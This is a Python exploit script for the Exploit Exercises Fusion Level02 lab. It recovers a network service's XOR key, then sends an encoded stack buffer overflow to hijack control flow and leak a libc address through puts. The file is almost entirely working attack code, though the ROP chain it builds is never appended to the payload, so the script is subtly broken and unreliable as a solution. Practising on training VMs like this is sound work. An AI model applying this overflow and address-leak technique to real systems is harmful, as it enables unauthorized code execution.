import socket
import struct
import time

BANNER = "[-- Enterprise configuration file encryption service --]\n"
ENCBANNER = "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n"

def p(x):
    return struct.pack("<I", x)

def init_connection():
    global s
    print (" [+] Initialize connection")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.12.131", 20002))

    time.sleep(1)
    banner = s.recv(len(BANNER)+1)
    #print ("Received banner: %s" % banner)

def send_cmd(data):
    cmd = "E" + p(len(data)) + data
    time.sleep(1)
    s.send(cmd)

def recv_data(size):
    time.sleep(1)
    return s.recv(size)

def get_xorkey():
    # XORKEY = size(unsigned int) * 32 => 128
    print (" [+] Retrieve xor key")
    plaintext = '\x00' * 128
    send_cmd(plaintext)
    return recv_encresponse()

def recv_encresponse():
    banner = recv_data(len(ENCBANNER))
    size = struct.unpack("<I", s.recv(4))[0]

    print ("Received banner: %s" % banner)
    print ("Received size: %s" % size)

    data = recv_data(size)
    return data

def xor(msg, key):
    result = ""
    for i in range(0, len(msg)):
        result += chr( ord(msg[i]) ^ ord(key[i % 128]))

    return result


def test_encryption(key):
    print (" [+] test xor encryption")
    testdata = "B"*128
    testenc = xor(testdata, key)

    send_cmd(testenc)
    response = recv_encresponse()

    if (testdata == response):
        print (" [+] XOR Test successful")
    else:
        print (" [-] XOR Test failed")
        exit()

def test_overflow(key):
    print (" [+] Test overflow")
    payload = "A"*((32*4096) + 16)
    payload += p(0xdeadbeef)
    encPayload = xor(payload, key)

    send_cmd(encPayload)

    response = recv_data(2048)
    s.send("Q")

def exploit(key):
    print (" [+] Exploit")

    ropchain = ""
    ropchain += p(0x080489c0)  # Address of puts@plt
    ropchain += p(0xdeadbeef)
    ropchain += p(0x1)
    ropchain += p(0x0804b3f8)  # Address of puts@got
    ropchain += p(0x4)

    payload = "A"*((32*4096) + 16)
    payload += p(0xdeadbeef)

    payload = xor(payload, key)

    send_cmd(payload)
    response = recv_encresponse()
    s.send("Q")
    time.sleep(1)
    libc_base_addr = recv_data(4)
    print (" [+] Base addr: %s" % libc_base_addr)
    
    #libc_base_addr = struct.unpack("<I", libc_base_addr)[0]
    #print (" [+] Base addr: 0x%x" % libc_base_addr)



print ("\nExploit Exercises - Fusion Level02")
print ("------------------------------------")
init_connection()
key = get_xorkey()
#test_encryption(key)
exploit(key)




